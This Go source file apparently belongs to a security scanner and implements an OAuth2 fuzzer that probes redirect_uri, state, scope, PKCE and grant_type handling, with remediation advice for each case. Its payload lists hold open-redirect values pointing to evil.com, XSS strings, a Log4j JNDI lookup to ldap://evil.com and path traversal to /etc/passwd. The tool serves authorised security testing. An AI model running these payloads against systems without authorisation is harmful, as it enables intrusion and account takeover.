package fuzzer

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"github.com/CodeMonkeyCybersecurity/shells/internal/httpclient"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/CodeMonkeyCybersecurity/shells/internal/core"
	"github.com/CodeMonkeyCybersecurity/shells/pkg/types"
)

type oauth2Fuzzer struct {
	client *http.Client
	config FuzzerConfig
	logger interface {
		Info(msg string, keysAndValues ...interface{})
		Error(msg string, keysAndValues ...interface{})
		Debug(msg string, keysAndValues ...interface{})
	}
}

type OAuth2Config struct {
	MaxPermutations  int
	ParallelRequests int
	Timeout          int
}

type FuzzerConfig struct {
	Threads      int
	RequestDelay time.Duration
	Timeout      time.Duration
	MaxRedirects int
	UserAgent    string
	EnableOOB    bool
	OOBServer    string
}

type OAuth2FuzzCase struct {
	Name        string
	Description string
	Parameter   string
	Payloads    []string
	Method      string
	Severity    types.Severity
	TestFunc    func(target, payload string) (*types.Finding, error)
}

type FuzzResult struct {
	TestCase     string
	Parameter    string
	Payload      string
	Response     *http.Response
	ResponseBody string
	Vulnerable   bool
	Evidence     string
}

// NewOAuth2Fuzzer creates a new OAuth2 fuzzer from OAuth2Config
func NewOAuth2Fuzzer(config OAuth2Config, logger interface {
	Info(msg string, keysAndValues ...interface{})
	Error(msg string, keysAndValues ...interface{})
	Debug(msg string, keysAndValues ...interface{})
}) core.Scanner {
	fuzzerConfig := FuzzerConfig{
		Threads:      config.ParallelRequests,
		Timeout:      time.Duration(config.Timeout) * time.Second,
		RequestDelay: 100 * time.Millisecond,
		MaxRedirects: 5,
	}
	return NewOAuth2FuzzerWithConfig(fuzzerConfig, logger)
}

// NewOAuth2FuzzerWithConfig creates a new OAuth2 fuzzer with full config
func NewOAuth2FuzzerWithConfig(config FuzzerConfig, logger interface {
	Info(msg string, keysAndValues ...interface{})
	Error(msg string, keysAndValues ...interface{})
	Debug(msg string, keysAndValues ...interface{})
}) core.Scanner {
	if config.Threads == 0 {
		config.Threads = 10
	}
	if config.Timeout == 0 {
		config.Timeout = 10 * time.Second
	}
	if config.RequestDelay == 0 {
		config.RequestDelay = 100 * time.Millisecond
	}

	return &oauth2Fuzzer{
		client: &http.Client{
			Timeout: config.Timeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= config.MaxRedirects {
					return fmt.Errorf("stopped after %d redirects", config.MaxRedirects)
				}
				return nil
			},
		},
		config: config,
		logger: logger,
	}
}

func (f *oauth2Fuzzer) Name() string {
	return "oauth2_fuzzer"
}

func (f *oauth2Fuzzer) Type() types.ScanType {
	return types.ScanType("fuzzing")
}

func (f *oauth2Fuzzer) Validate(target string) error {
	if target == "" {
		return fmt.Errorf("target cannot be empty")
	}

	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		return fmt.Errorf("target must be a valid HTTP/HTTPS URL")
	}

	return nil
}

func (f *oauth2Fuzzer) Scan(ctx context.Context, target string, options map[string]string) ([]types.Finding, error) {
	f.logger.Info("Starting OAuth2 parameter fuzzing", "target", target)

	findings := []types.Finding{}

	// Get OAuth2 fuzzing test cases
	testCases := f.getOAuth2TestCases(options)

	// Run each test case
	for _, testCase := range testCases {
		f.logger.Debug("Running OAuth2 fuzz test", "test", testCase.Name, "param", testCase.Parameter)

		for _, payload := range testCase.Payloads {
			select {
			case <-ctx.Done():
				return findings, ctx.Err()
			default:
			}

			// Apply rate limiting
			time.Sleep(f.config.RequestDelay)

			// Execute test
			result, err := f.executeTest(ctx, target, testCase, payload, options)
			if err != nil {
				f.logger.Error("Test execution failed", "test", testCase.Name, "error", err)
				continue
			}

			if result.Vulnerable {
				finding := types.Finding{
					Tool:        "oauth2_fuzzer",
					Type:        "oauth2_parameter_vulnerability",
					Severity:    testCase.Severity,
					Title:       fmt.Sprintf("OAuth2 %s Vulnerability", testCase.Name),
					Description: testCase.Description,
					Evidence:    result.Evidence,
					Solution:    f.getSolution(testCase.Name),
					Metadata: map[string]interface{}{
						"parameter":     testCase.Parameter,
						"payload":       result.Payload,
						"test_case":     testCase.Name,
						"response_code": result.Response.StatusCode,
					},
				}
				findings = append(findings, finding)

				f.logger.Info("Vulnerability found",
					"test", testCase.Name,
					"param", testCase.Parameter,
					"payload", result.Payload[:min(50, len(result.Payload))],
				)
			}
		}
	}

	return findings, nil
}

func (f *oauth2Fuzzer) getOAuth2TestCases(options map[string]string) []OAuth2FuzzCase {
	oobServer := f.config.OOBServer
	if oobServer == "" {
		oobServer = "https://interact.sh"
	}

	return []OAuth2FuzzCase{
		{
			Name:        "Redirect URI Bypass",
			Description: "Tests for redirect URI validation bypass vulnerabilities",
			Parameter:   "redirect_uri",
			Severity:    types.SeverityCritical,
			Payloads: []string{
				"//evil.com",
				"https://evil.com",
				"http://evil.com",
				"javascript:alert(1)",
				"data:text/html,<script>alert(1)</script>",
				"vbscript:msgbox(1)",
				fmt.Sprintf("https://evil.com@%s", f.extractHost(options["redirect_uri"])),
				fmt.Sprintf("https://%s.evil.com", f.extractHost(options["redirect_uri"])),
				fmt.Sprintf("https://%s#@evil.com", f.extractHost(options["redirect_uri"])),
				fmt.Sprintf("https://%s?redirect=https://evil.com", f.extractHost(options["redirect_uri"])),
				"file:///etc/passwd",
				"ftp://evil.com",
				"ldap://evil.com",
				"gopher://evil.com",
				oobServer,
			},
		},
		{
			Name:        "State Parameter Manipulation",
			Description: "Tests for state parameter vulnerabilities and CSRF",
			Parameter:   "state",
			Severity:    types.SeverityMedium,
			Payloads: []string{
				"",                          // Empty state
				"1234",                      // Weak state
				"admin",                     // Predictable state
				"test",                      // Common state
				"<script>alert(1)</script>", // XSS
				"${jndi:ldap://evil.com/a}", // Log4j
				"../../etc/passwd",          // Path traversal
				strings.Repeat("A", 10000),  // Long input
				"null",
				"undefined",
				"0",
				"-1",
			},
		},
		{
			Name:        "Client ID Enumeration",
			Description: "Tests for client ID enumeration and validation bypass",
			Parameter:   "client_id",
			Severity:    types.SeverityMedium,
			Payloads: []string{
				"admin",
				"test",
				"1234",
				"client",
				"app",
				"mobile",
				"web",
				"api",
				"",
				"null",
				"undefined",
				"../../../etc/passwd",
				"<script>alert(1)</script>",
				strings.Repeat("A", 1000),
			},
		},
		{
			Name:        "Response Type Confusion",
			Description: "Tests for response type confusion vulnerabilities",
			Parameter:   "response_type",
			Severity:    types.SeverityHigh,
			Payloads: []string{
				"code token",          // Hybrid flow
				"code id_token",       // Hybrid flow
				"code token id_token", // Hybrid flow
				"token code",          // Reversed
				"id_token code",       // Reversed
				"invalid",             // Invalid type
				"",                    // Empty
				"code%20token",        // URL encoded
				"code+token",          // Plus encoded
				"none",                // Invalid
				"implicit",            // Legacy
			},
		},
		{
			Name:        "Scope Manipulation",
			Description: "Tests for privilege escalation via scope manipulation",
			Parameter:   "scope",
			Severity:    types.SeverityHigh,
			Payloads: []string{
				"admin",
				"root",
				"superuser",
				"read write admin",
				"openid profile email admin",
				"*",
				"all",
				"everything",
				"read:admin write:admin",
				"user:admin",
				"scope:admin",
				strings.Repeat("admin ", 100),
				"read\nwrite\nadmin", // Newline injection
				"read write delete",  // Additional permissions
			},
		},
		{
			Name:        "PKCE Code Challenge Bypass",
			Description: "Tests for PKCE implementation vulnerabilities",
			Parameter:   "code_challenge",
			Severity:    types.SeverityHigh,
			Payloads: []string{
				"",                       // Empty challenge
				"1234",                   // Weak challenge
				"plain",                  // Plain text (should use S256)
				"test",                   // Predictable
				strings.Repeat("A", 128), // Max length
				strings.Repeat("A", 43),  // Min length
				"invalid_base64!",        // Invalid base64
				base64.URLEncoding.EncodeToString([]byte("weak")), // Weak entropy
			},
		},
		{
			Name:        "Nonce Manipulation",
			Description: "Tests for nonce validation vulnerabilities",
			Parameter:   "nonce",
			Severity:    types.SeverityMedium,
			Payloads: []string{
				"",                          // Empty nonce
				"1234",                      // Weak nonce
				"test",                      // Predictable
				"admin",                     // Privileged
				"replay",                    // Replay attack
				"<script>alert(1)</script>", // XSS
				strings.Repeat("A", 1000),   // Long input
				"../../etc/passwd",          // Path traversal
				"null",
				"undefined",
			},
		},
		{
			Name:        "Grant Type Confusion",
			Description: "Tests for grant type validation vulnerabilities",
			Parameter:   "grant_type",
			Severity:    types.SeverityHigh,
			Payloads: []string{
				"password",           // Resource owner password
				"client_credentials", // Client credentials
				"refresh_token",      // Refresh token
				"implicit",           // Implicit (deprecated)
				"authorization_code", // Authorization code
				"device_code",        // Device code
				"",                   // Empty
				"invalid",            // Invalid type
				"code",               // Shortened
				"token",              // Token
			},
		},
	}
}

func (f *oauth2Fuzzer) executeTest(ctx context.Context, target string, testCase OAuth2FuzzCase, payload string, options map[string]string) (*FuzzResult, error) {
	// Build test URL
	baseURL, err := url.Parse(target)
	if err != nil {
		return nil, err
	}

	// Build query parameters
	params := url.Values{}

	// Add default OAuth2 parameters
	params.Set("client_id", f.getOrDefault(options, "client_id", "test_client"))
	params.Set("response_type", f.getOrDefault(options, "response_type", "code"))
	params.Set("redirect_uri", f.getOrDefault(options, "redirect_uri", "https://example.com/callback"))
	params.Set("state", f.generateRandomString(16))
	params.Set("scope", f.getOrDefault(options, "scope", "openid profile"))

	// Override with fuzzed parameter
	params.Set(testCase.Parameter, payload)

	// Handle special cases for certain parameters
	switch testCase.Parameter {
	case "code_challenge":
		params.Set("code_challenge_method", "S256")
	case "grant_type":
		// For grant_type fuzzing, use token endpoint
		if strings.Contains(target, "/authorize") {
			target = strings.Replace(target, "/authorize", "/token", 1)
		}
	}

	baseURL.RawQuery = params.Encode()
	testURL := baseURL.String()

	// Create request
	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		return nil, err
	}

	if f.config.UserAgent != "" {
		req.Header.Set("User-Agent", f.config.UserAgent)
	}

	// Execute request
	resp, err := f.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer httpclient.CloseBody(resp)

	// Read response body (limited to prevent memory issues)
	bodyBytes := make([]byte, 10240) // 10KB limit
	n, _ := resp.Body.Read(bodyBytes)
	responseBody := string(bodyBytes[:n])

	// Analyze response for vulnerabilities
	vulnerable, evidence := f.analyzeResponse(testCase, payload, resp, responseBody)

	return &FuzzResult{
		TestCase:     testCase.Name,
		Parameter:    testCase.Parameter,
		Payload:      payload,
		Response:     resp,
		ResponseBody: responseBody,
		Vulnerable:   vulnerable,
		Evidence:     evidence,
	}, nil
}

func (f *oauth2Fuzzer) analyzeResponse(testCase OAuth2FuzzCase, payload string, resp *http.Response, body string) (bool, string) {
	evidence := []string{}

	switch testCase.Name {
	case "Redirect URI Bypass":
		// Check if redirect was successful to malicious domain
		if resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
			location := resp.Header.Get("Location")
			if strings.Contains(location, "evil.com") ||
				strings.Contains(location, "interact.sh") ||
				strings.HasPrefix(location, "javascript:") ||
				strings.HasPrefix(location, "data:") {
				evidence = append(evidence, fmt.Sprintf("Malicious redirect to: %s", location))
				return true, strings.Join(evidence, "\n")
			}
		}

	case "State Parameter Manipulation":
		// Check for missing state validation
		if (payload == "" || payload == "1234") &&
			(resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusOK) {
			evidence = append(evidence, "Server accepted weak/missing state parameter")
			return true, strings.Join(evidence, "\n")
		}

		// Check for XSS in state parameter
		if strings.Contains(payload, "<script>") && strings.Contains(body, "<script>") {
			evidence = append(evidence, "XSS payload reflected in response")
			return true, strings.Join(evidence, "\n")
		}

	case "Client ID Enumeration":
		// Check for information disclosure
		if resp.StatusCode == http.StatusOK &&
			(strings.Contains(body, "admin") || strings.Contains(body, "internal")) {
			evidence = append(evidence, "Potential information disclosure in response")
			return true, strings.Join(evidence, "\n")
		}

	case "Response Type Confusion":
		// Check for hybrid flow acceptance
		if strings.Contains(payload, " ") && resp.StatusCode == http.StatusFound {
			location := resp.Header.Get("Location")
			if strings.Contains(location, "access_token=") && strings.Contains(location, "code=") {
				evidence = append(evidence, "Hybrid flow accepted, potential token leakage")
				return true, strings.Join(evidence, "\n")
			}
		}

	case "Scope Manipulation":
		// Check for privilege escalation
		if strings.Contains(strings.ToLower(payload), "admin") && resp.StatusCode == http.StatusFound {
			evidence = append(evidence, "Admin scope accepted")
			return true, strings.Join(evidence, "\n")
		}

	case "PKCE Code Challenge Bypass":
		// Check for PKCE bypass
		if (payload == "" || payload == "1234") &&
			(resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusOK) {
			evidence = append(evidence, "PKCE challenge bypass possible")
			return true, strings.Join(evidence, "\n")
		}

	case "Grant Type Confusion":
		// Check for grant type confusion
		if resp.StatusCode == http.StatusOK &&
			(strings.Contains(body, "access_token") || strings.Contains(body, "token")) {
			evidence = append(evidence, "Unexpected grant type accepted")
			return true, strings.Join(evidence, "\n")
		}
	}

	// General vulnerability indicators
	if resp.StatusCode >= 500 {
		evidence = append(evidence, fmt.Sprintf("Server error (HTTP %d) - potential DoS", resp.StatusCode))
		return true, strings.Join(evidence, "\n")
	}

	// Check for error disclosure
	if strings.Contains(body, "stack trace") ||
		strings.Contains(body, "exception") ||
		strings.Contains(body, "database") ||
		strings.Contains(body, "SQL") {
		evidence = append(evidence, "Information disclosure in error message")
		return true, strings.Join(evidence, "\n")
	}

	return false, ""
}

func (f *oauth2Fuzzer) extractHost(uri string) string {
	if uri == "" {
		return "example.com"
	}

	u, err := url.Parse(uri)
	if err != nil {
		return "example.com"
	}

	return u.Host
}

func (f *oauth2Fuzzer) getOrDefault(options map[string]string, key, defaultValue string) string {
	if value, ok := options[key]; ok && value != "" {
		return value
	}
	return defaultValue
}

func (f *oauth2Fuzzer) generateRandomString(length int) string {
	bytes := make([]byte, length)
	rand.Read(bytes)
	return base64.URLEncoding.EncodeToString(bytes)[:length]
}

func (f *oauth2Fuzzer) getSolution(testCase string) string {
	solutions := map[string]string{
		"Redirect URI Bypass": "Implement strict redirect URI validation:\n" +
			"1. Use exact string matching for redirect URIs\n" +
			"2. Maintain a whitelist of allowed redirect URIs\n" +
			"3. Validate protocol, host, port, and path separately\n" +
			"4. Reject URLs with user-controlled components",
		"State Parameter Manipulation": "Implement proper state parameter handling:\n" +
			"1. Generate cryptographically random state values\n" +
			"2. Bind state to user session\n" +
			"3. Validate state on callback\n" +
			"4. Use at least 128 bits of entropy",
		"Client ID Enumeration": "Secure client ID handling:\n" +
			"1. Use UUIDs or cryptographically random client IDs\n" +
			"2. Implement rate limiting for client validation\n" +
			"3. Avoid information disclosure in error messages\n" +
			"4. Log suspicious enumeration attempts",
		"Response Type Confusion": "Restrict response types:\n" +
			"1. Only allow specific response_type values\n" +
			"2. Reject hybrid flows unless explicitly needed\n" +
			"3. Validate client is authorized for requested flow\n" +
			"4. Follow OAuth 2.0 Security BCP",
		"Scope Manipulation": "Implement proper scope validation:\n" +
			"1. Validate requested scopes against client permissions\n" +
			"2. Use principle of least privilege\n" +
			"3. Implement scope hierarchies properly\n" +
			"4. Audit scope grants regularly",
		"PKCE Code Challenge Bypass": "Enforce PKCE properly:\n" +
			"1. Require code_challenge for public clients\n" +
			"2. Validate code_verifier matches challenge\n" +
			"3. Use S256 method only\n" +
			"4. Reject requests without proper PKCE",
		"Grant Type Confusion": "Validate grant types strictly:\n" +
			"1. Only allow configured grant types per client\n" +
			"2. Validate grant type matches endpoint\n" +
			"3. Implement proper client authentication\n" +
			"4. Follow OAuth 2.0 specifications",
	}

	if solution, ok := solutions[testCase]; ok {
		return solution
	}
	return "Implement proper OAuth 2.0 security controls and follow security best practices"
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
